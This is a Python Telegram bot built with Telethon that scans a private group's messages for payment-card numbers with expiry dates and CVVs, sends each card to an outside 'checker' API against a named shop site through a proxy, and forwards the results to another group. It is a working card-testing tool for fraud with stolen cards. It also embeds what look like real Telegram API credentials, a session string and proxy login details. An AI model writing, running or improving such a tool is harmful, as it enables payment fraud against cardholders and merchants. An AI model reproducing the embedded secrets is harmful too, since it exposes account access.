# fast_dedup_card_bot.py
import re
import aiohttp
import asyncio
import random
import logging
import time
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from typing import Optional, Set, Dict

# ---------------- CONFIG ----------------
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("droper")

# Replace these with your real details
api_id = 17455551
api_hash = "abde39d2fad230528b2695a14102e76a"
SESSION_STRING = "1BVtsOLwBu6ENhB2xUwqQMeRb6FQoytffPpwMLt-CwrOa3uq6NQlpb3nN4nIByzoDeWalXRhiZaiRbdCqCOHWG3mfsFZcw_YijQUdLK7rdS-5AXRsY5oQdKACOoiHgtslVac2_wNCL6MA_UUhU5orRzaV7kkBtimv6XY6y-9yab4SlrUsxafzOjhqfhDRfX-stkrHgp9_wwOMYheTnUbzMkRsQnjAFLsd-AuuVkXdTPI1HoPzDzRVma_7ysD8K4fNaO2VWYoQQ0yM3-jcRGpGELYARrTz6AvVLSaosypQPGX_B-ukh1CJc_2hVKxz3FgxCiP6md1rMlzQujNB6ejl20L0_2P-yf4="

PRIVATE_GROUP_ID = -1002682944548   # where you listen for incoming messages
TARGET_GROUP_ID = -1002968335063    # where you forward results
ADMIN_ID = 8493360284

API_URL = "https://autosh.arpitchk.shop/puto.php"  # your API
SITE = "https://jasonwubeauty.com"

PROXIES = ["45.41.172.51:5794:juftilus:atasaxde44jl"]  # optional; passed as API param

# concurrency you asked for
NUM_CONCURRENT = 5

# global dedupe window (seconds) — card won't be reprocessed within this interval
GLOBAL_DEDUPE_SECONDS = 60 * 30  # 30 minutes; change as desired

# ---------------- CLIENT & STATE ----------------
client = TelegramClient(StringSession(SESSION_STRING), api_id, api_hash)
session: Optional[aiohttp.ClientSession] = None

semaphore = asyncio.Semaphore(NUM_CONCURRENT)

# in-progress tokens (to avoid processing same card concurrently)
_in_progress: Set[str] = set()

# recently processed with timestamps for global dedupe
_recent_processed: Dict[str, float] = {}

# resolved target entity (Telethon entity) to avoid "Could not find input entity"
_target_entity = None

# ---------------- REGEX (robust but fast) ----------------
# We'll try to be permissive but keep it quick: look for 13-19 digit cc plus mm yy cvv nearby
SIMPLE_CARD_REGEX = re.compile(
    r"""
    (?P<cc>\d{13,19})            # card number 13..19
    [^\d]{0,8}?                  # small gap
    (?P<mm>\d{2})                # month
    [^\d]{0,4}?                  # small gap
    (?P<yy>\d{2,4})              # year (2 or 4)
    [^\d]{0,6}?                  # small gap
    (?P<cvv>\d{3,4})             # cvv
    """,
    re.VERBOSE,
)

# Also allow grouped 4-4-4-4 then mm yy cvv
GROUPED_REGEX = re.compile(
    r"(?P<cc>(?:\d{4}[\s\-\.\|/]){3}\d{4})\D{0,6}(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})"
)

# fallback: 4 tokens where lengths plausible
FALLBACK_REGEX = re.compile(
    r"(?P<t1>\d{12,19})\D{1,6}(?P<t2>\d{2})\D{1,6}(?P<t3>\d{2,4})\D{1,6}(?P<t4>\d{3,4})"
)

# quick list of patterns to test in order (keeps detection fast)
PATTERNS = (SIMPLE_CARD_REGEX, GROUPED_REGEX, FALLBACK_REGEX)

# helpers for normalization
_SEP_CLEAN = re.compile(r"[\s\-\.\|/]")

def normalize_cc(cc_raw: str) -> str:
    s = _SEP_CLEAN.sub("", str(cc_raw))
    s = re.sub(r"\D", "", s)
    return s

def normalize_year(yy: str) -> str:
    yy = yy.strip()
    if len(yy) == 4:
        return yy[-2:]
    return yy.zfill(2)

def build_token(cc: str, mm: str, yy: str, cvv: str) -> Optional[str]:
    cc_n = normalize_cc(cc)
    if not (13 <= len(cc_n) <= 19):
        return None
    try:
        mm_i = int(mm)
        if not (1 <= mm_i <= 12):
            return None
    except Exception:
        return None
    yy_n = normalize_year(yy)
    cvv_n = re.sub(r"\D", "", cvv)
    return f"{cc_n}|{mm_i:02d}|{yy_n}|{cvv_n}"

# ---------------- API CALL ----------------
async def call_api(card_token: str, retries: int = 2, timeout: int = 12) -> dict:
    proxy_choice = random.choice(PROXIES) if PROXIES else ""
    params = {"site": SITE, "cc": card_token, "proxy": proxy_choice}
    backoff = 1.0
    for attempt in range(retries + 1):
        try:
            async with session.get(API_URL, params=params, timeout=timeout) as resp:
                # try parse json
                text = await resp.text()
                try:
                    return await resp.json()
                except Exception:
                    return {"Response": text.strip()}
        except asyncio.CancelledError:
            raise
        except Exception as e:
            logger.debug("API call failed (%d/%d): %s", attempt + 1, retries + 1, e)
            if attempt < retries:
                await asyncio.sleep(backoff)
                backoff *= 2
            else:
                return {"Response": f"API Error: {e}"}
    return {"Response": "Unknown error"}

# ---------------- PROCESS / SENDING ----------------
async def process_card(card_token: str, source_event):
    """
    Main card worker. Ensures:
      - concurrency limited by semaphore
      - in-progress dedupe
      - global dedupe window
      - sends only card token and API response (stylish)
    """
    now = time.time()
    # global dedupe: skip if processed recently
    last = _recent_processed.get(card_token)
    if last and (now - last) < GLOBAL_DEDUPE_SECONDS:
        logger.info("Skipping recently processed card %s", card_token)
        return

    if card_token in _in_progress:
        logger.info("Card already in progress %s", card_token)
        return

    # mark in progress
    _in_progress.add(card_token)
    try:
        async with semaphore:
            logger.info("Processing card %s", card_token)
            result = await call_api(card_token)
            response = result.get("Response", "No response")
            # Save timestamp for dedupe
            _recent_processed[card_token] = time.time()

            # Build stylish short message: card (masked except last4) + response
            cc = card_token.split("|")[0]
            masked = f"{cc[:-4]}****{cc[-4:]}" if len(cc) > 8 else f"{cc}"
            stylish = f"💳 `{masked}` — {response}"

            # send to target (use resolved entity if available)
            try:
                if _target_entity is not None:
                    await client.send_message(_target_entity, stylish)
                else:
                    # fallback: send by numeric id (may fail if not in session)
                    await client.send_message(TARGET_GROUP_ID, stylish)
                logger.info("Sent result for %s -> %s", card_token, response)
            except Exception as e:
                logger.warning("Failed to send result for %s: %s", card_token, e)

    finally:
        _in_progress.discard(card_token)

# ---------------- EXTRA: keep recent dict small ----------------
async def _cleanup_recent_task():
    while True:
        await asyncio.sleep(60)
        cutoff = time.time() - GLOBAL_DEDUPE_SECONDS
        keys = [k for k, t in _recent_processed.items() if t < cutoff]
        for k in keys:
            _recent_processed.pop(k, None)
        # keep memory bounded
        if len(_recent_processed) > 100000:
            # remove oldest
            items = sorted(_recent_processed.items(), key=lambda it: it[1])
            for k, _ in items[: len(items) // 2]:
                _recent_processed.pop(k, None)

# ---------------- MESSAGE HANDLER ----------------
@client.on(events.NewMessage(chats=PRIVATE_GROUP_ID))
async def on_new_msg(event):
    """
    Fast handler: extracts first unique card token per message and schedules processing.
    """
    text = event.raw_text or ""
    if not text.strip():
        return

    # Try patterns in order and take the first normalized token we can build.
    found_token = None
    for pat in PATTERNS:
        m = pat.search(text)
        if not m:
            continue
        # attempt to extract named groups if present, else positional
        gd = m.groupdict()
        if gd:
            cc = gd.get("cc") or gd.get("t1")
            mm = gd.get("mm") or gd.get("t2")
            yy = gd.get("yy") or gd.get("t3")
            cvv = gd.get("cvv") or gd.get("t4")
        else:
            groups = m.groups()
            # pick first four numeric-like groups
            if len(groups) >= 4:
                cc, mm, yy, cvv = groups[0], groups[1], groups[2], groups[3]
            else:
                continue
        token = build_token(cc, mm, yy, cvv)
        if token:
            # Ensure token not processed recently and not duplicate inside message
            if token in _recent_processed or token in _in_progress:
                logger.debug("Token already processed or in progress: %s", token)
                # continue scanning in case another token is present
                continue
            found_token = token
            break

    if found_token:
        # schedule immediate processing (do not await)
        asyncio.create_task(process_card(found_token, event))
        logger.info("Scheduled card %s from message %s", found_token, event.id)
    else:
        # nothing matched quickly; do a broader scan for multiple tokens to be thorough but slower
        # optional: skip to keep handler fast
        pass

# ---------------- ADMIN COMMANDS ----------------
@client.on(events.NewMessage(from_users=ADMIN_ID))
async def admin_handler(event):
    global dropping_enabled
    txt = (event.raw_text or "").strip().lower()
    if txt == "/start":
        await event.reply("✅ Bot is running and listening for cards.")
    elif txt == "/drop":
        dropping_enabled = True
        await event.reply("✅ Dropping enabled. Results will be forwarded.")
    elif txt == "/stop":
        dropping_enabled = False
        await event.reply("⏹ Dropping disabled.")
    elif txt == "/status":
        await event.reply(f"✅ dropping: {dropping_enabled}\nconcurrency: {NUM_CONCURRENT}\nrecent tokens: {len(_recent_processed)}")
    else:
        return

# ---------------- STARTUP ----------------
async def main():
    global session, _target_entity
    session = aiohttp.ClientSession()

    await client.start()
    logger.info("Telethon client started. Resolving target entity...")

    # try to resolve target entity once (avoid 'Could not find input entity' later)
    try:
        _target_entity = await client.get_entity(TARGET_GROUP_ID)
        logger.info("Target entity resolved: %s", _target_entity)
    except Exception as e:
        _target_entity = None
        logger.warning("Could not resolve target entity at startup: %s. Will fallback to numeric id.", e)

    # start cleanup task
    asyncio.create_task(_cleanup_recent_task())

    logger.info("Listening for messages in %s", PRIVATE_GROUP_ID)
    await client.run_until_disconnected()

    await session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Stopped by user")
